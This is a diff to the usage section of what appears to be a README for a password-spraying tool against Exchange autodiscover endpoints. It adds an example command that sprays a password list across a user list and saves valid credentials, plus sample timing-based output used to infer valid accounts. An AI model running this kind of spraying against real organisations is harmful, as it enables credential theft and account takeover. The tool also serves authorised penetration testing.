@@ -31,12 +31,20 @@ optional arguments:
 
 Example output:
 ```Python
+./401_spray.py -v -U https://autodiscover.<target>.com/autodiscover/autodiscover.xml -p /users/bortiz/Documents/Projects/passwords.txt -u /users/bortiz/Documents/Projects/user_names.txt -t 100 -o /users/bortiz/Documents/Projects/valid_creds.txt
+
 New password spraying run
 Spraying 1 passwords, then sleeping for 120.
 URL: https://autodiscover.<target>.com/autodiscover/autodiscover.xml
-[+] auth creds: <target>\aaaaaaz, time elapsed: 0:00:03.850058
-[+] auth creds: <target>\bbbbbbz, time elapsed: 0:00:03.648372
-[+] auth creds: <target>\ccccccz, time elapsed: 0:00:07.896346
-[+] Avg time: 0:00:05.131592
-[*] Threshold: 0:00:03.078955
+[+] Domain Found: <target>
+[*] Performing incorrect Domain Test
+[+] auth creds: random\aaaaaaz, time elapsed: 0:00:05.048192
+[+] auth creds: anything1\bbbbbbz, time elapsed: 0:00:00.309263
+[+] auth creds: bread_man\ccccccz, time elapsed: 0:00:00.379083
+[*] Performing incorrect Username Test
+[+] auth creds: <target>\aaaaaaz, time elapsed: 0:00:07.880553
+[+] auth creds: <target>\bbbbbbz, time elapsed: 0:00:03.642619
+[+] auth creds: <target>\ccccccz, time elapsed: 0:00:03.653361
+[+] Avg time: 0:00:05.058844
+[*] Threshold: 0:00:03.035306
 ```
